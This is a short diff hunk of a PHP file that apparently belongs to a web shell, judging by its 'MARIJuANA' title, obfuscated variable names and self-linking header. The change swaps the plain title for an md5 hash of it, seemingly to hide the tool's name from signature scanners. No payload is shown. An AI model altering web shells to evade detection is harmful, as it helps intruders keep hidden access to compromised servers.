@@ -30,7 +30,7 @@ for ($i = 0; $i < $___; $i++) {
     <header>
         <div class="y x">
             <a class="ajx" href="<?php echo basename($_SERVER['PHP_SELF']); ?>">
-                MARIJuANA
+                <?php echo md5('MARIJuANA');?>
             </a>
         </div>
 
